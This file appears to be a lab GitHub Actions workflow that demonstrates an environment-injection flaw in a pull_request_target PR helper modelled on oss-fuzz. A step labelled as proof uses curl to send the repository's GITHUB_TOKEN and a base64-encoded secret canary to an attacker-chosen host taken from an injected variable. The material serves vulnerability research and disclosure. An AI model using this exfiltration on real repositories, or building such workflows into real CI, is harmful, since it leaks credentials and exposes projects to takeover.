name: PR helper (lab)
on:
  pull_request_target:
    types: [opened]
    branches:
      - main
    paths:
      - 'projects/**'

jobs:
  build:
    runs-on: ubuntu-latest

    permissions:
      contents: read
      pull-requests: write

    steps:
      - uses: actions/checkout@v6
      - name: Setup python environment
        uses: actions/setup-python@v6
        with:
          python-version: 3.11
          cache: pip
          cache-dependency-path: |
            infra/ci/requirements.txt

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r infra/ci/requirements.txt

      - name: Check if authors are authorized to modify.
        id: checkAuthor
        env:
          GITHUBTOKEN: ${{secrets.GITHUB_TOKEN}}
          PRAUTHOR: ${{ github.event.pull_request.user.login }}
          PRNUMBER: ${{ github.event.pull_request.number }}
          LAB_OWNER: ${{ github.repository_owner }}
          LAB_REPO: ${{ github.event.repository.name }}
          CRITICALITY_SCORE_PATH: /bin/true
        run: python infra/pr_helper_fixed.py

      # PRIVILEGED CONSUMER: every step below sees the job env produced by the step above,
      # exactly like oss-fuzz's `actions/github-script` "Leave comments" step.
      - name: "PROOF: privileged consumer sends token + canary to an attacker-chosen env var"
        if: always()
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          CANARY: ${{ secrets.CANARY }}
        run: |
          echo "=== env inherited from the pr_helper step (GITHUB_ENV) ==="
          echo "CANARY_SINK=${CANARY_SINK}"
          echo "GITHUB_API_URL=${GITHUB_API_URL}   (GITHUB_* defaults are protected by the runner)"
          echo "EVILPAD=${EVILPAD}"
          C=$(printf '%s' "$CANARY" | base64 -w0)
          if [ -n "${CANARY_SINK}" ]; then
            echo "=== injection succeeded: token-bearing request to attacker host ${CANARY_SINK} ==="
            curl -sS -m 20 -H "Authorization: Bearer ${GH_TOKEN}" \
              "${CANARY_SINK}?canary=${C}" | head -c 3000 || true
          else
            echo "=== no injection: CANARY_SINK unset, nothing leaves the runner ==="
          fi

      - name: Add labels for valid PR
        if: env.IS_READY_FOR_MERGE == 'True'
        uses: actions/github-script@v8
        with:
          script: |
            console.log('LABELING: IS_READY_FOR_MERGE=', process.env.IS_READY_FOR_MERGE);
            await github.rest.issues.addLabels({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              labels: ['Ready to merge']
            })

      - name: Leave comments (faithful oss-fuzz consumer, non-blocking)
        if: always()
        continue-on-error: true
        uses: actions/github-script@v8
        with:
          github-token: ${{secrets.GITHUB_TOKEN}}
          script: |
            console.log('GITHUB_API_URL =', process.env.GITHUB_API_URL);
            await github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: process.env.MESSAGE
            })
